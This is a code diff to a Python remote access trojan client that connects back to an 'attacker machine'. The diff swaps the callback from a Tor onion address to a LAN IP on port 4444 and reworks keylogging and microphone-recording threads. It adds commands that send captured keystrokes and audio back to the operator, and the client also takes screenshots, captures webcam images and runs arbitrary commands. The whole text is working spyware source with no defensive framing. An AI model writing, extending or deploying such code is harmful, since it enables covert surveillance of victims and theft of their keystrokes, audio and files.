@@ -20,10 +20,10 @@ stop = False
 def connect():
 	while True:
 		try:
-			socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
-			socket.socket = socks.socksocket
+			# socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9050)
+			# socket.socket = socks.socksocket
 			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-			s.connect(('3xazduds5wdy57xzgnni3azqtzdt5eahufpp44gdevw2rvqi4mrwi4yd.onion', 4444))  # IP and Port of the attacker machine
+			s.connect(('172.20.10.2', 4444))  # IP and Port of the attacker machine
 			return s
 		except Exception:
 			time.sleep(5)
@@ -72,21 +72,21 @@ def capture_webcam():
     except Exception as e:
         return f"Error capturing webcam: {str(e)}"
 def send_post_req(time_interval):
-    global stop, text 
-    if stop:
-        return
-    try:
-        payload = json.dumps({"keyboardData" : text})
-        with open("Keylogg.txt", "a", encoding="utf-8") as f:
-            f.write(payload + "\n")
-        
-        text = ""
-        timer = threading.Timer(time_interval, send_post_req, args=(time_interval,))
-        timer.start()
-    except Exception as e:
-        print(e)
-        print("Couldn't complete request!")
-	
+    global stop, text
+    while not stop:
+        try:
+            payload = json.dumps({"keyboardData": text})
+            with open("Keylogg.txt", "a", encoding="utf-8") as f:
+                f.write(payload + "\n")
+            text = ""
+        except Exception as e:
+            print(e)
+            print("Couldn't complete request!")
+        for _ in range(time_interval):
+            if stop:
+                break
+            time.sleep(1)
+
 def on_press(key):
     global text
     if key == keyboard.Key.enter:
@@ -97,45 +97,37 @@ def on_press(key):
         text += " "
     elif key == keyboard.Key.shift:
         pass
-    elif key == keyboard.Key.backspace and len(text) == 0:
-        pass
     elif key == keyboard.Key.backspace and len(text) > 0:
         text = text[:-1]
     elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
         pass
-    elif key == keyboard.Key.esc:
-        return False
     else:
         text += str(key).strip("'")
 
 def keylogger():
-    global text
     global stop
+    global text
     text = ""
-    time_interval = 10
-	
-	
-    with keyboard.Listener(on_press=on_press) as listener:
-        if stop:
-            return
-        send_post_req(time_interval)
-        listener.join()
-		
+    time_interval = 30
+    listener = keyboard.Listener(on_press=on_press)
+    listener.start()
 
-def record_microphone(duration=5):
+    send_post_req(time_interval)
+
+    listener.stop()
+
+def record_microphone():
     try:
         CHUNK = 1024
         FORMAT = pyaudio.paInt16
         CHANNELS = 1
         RATE = 44100
-        RECORD_SECONDS = duration
         
         audio = pyaudio.PyAudio()
         stream = audio.open(format=FORMAT, channels=CHANNELS,
                             rate=RATE, input=True,
                             frames_per_buffer=CHUNK)
         
-        print("Recording microphone...")
         frames = []
         while not stop : 
             if stop:
@@ -143,7 +135,6 @@ def record_microphone(duration=5):
             data = stream.read(CHUNK)
             frames.append(data)
 	
-        print("Finished recording.")
         stream.stop_stream()
         stream.close()
         audio.terminate()
@@ -164,6 +155,8 @@ def rat_client():
 	global stop
 	s = connect()
 	try:
+		keylogger_thread = threading.Thread(target=keylogger, daemon=True)
+		mic_thread = threading.Thread(target=record_microphone, daemon=True)
 		while True:
 			data = s.recv(1000000)
 			if not data:
@@ -195,14 +188,15 @@ def rat_client():
 			elif command == 'keylogger':
 				stop = False
 				s.send(str.encode("Keylogging ..."))
-				keylogger_thread = threading.Thread(target=keylogger, daemon=True)
 				keylogger_thread.start()
-				while not stop:
-					if s.recv(1024).decode() == "stop":
-						stop = True
-				keylogger_thread.join()
-				s.send(read_file("keylogg.txt").encode())
-				execute_commands("del keylogg.txt")
+			elif command == 'getkeylogger':
+				if keylogger_thread.is_alive():
+					stop = True
+					keylogger_thread.join()
+					s.send(read_file("keylogg.txt").encode())
+					execute_commands("del keylogg.txt")
+				else:
+					s.send(str.encode("Keylogger is not running."))
 			elif command == 'screenshot':
 				capture_screen()
 				s.send(read_file("screen.png").encode())
@@ -213,20 +207,16 @@ def rat_client():
 				execute_commands("del webcam.png")
 			elif command.startswith('mic'):
 				stop = False
-				try:
-					duration = int(command.split(' ')[1])
-				except:
-					duration = 5
 				s.send(str.encode("Recording ..."))
-				mic_thread = threading.Thread(target=record_microphone, args=(duration,), daemon=True)
 				mic_thread.start()
-				while not stop:
-					if s.recv(1024).decode() == "stop":
-						stop = True
-				mic_thread.join()
-				#record_microphone(duration)
-				s.send(read_file("microphone.wav").encode())
-				execute_commands("del microphone.wav")
+			elif command == 'getmicrecord':
+				if mic_thread.is_alive():
+					stop = True
+					mic_thread.join()
+					s.send(read_file("microphone.wav").encode())
+					execute_commands("del microphone.wav")
+				else:
+					s.send(str.encode("Microphone recording is not running."))
 			else:
 				output = execute_commands(command)
 				s.send(str.encode(output))
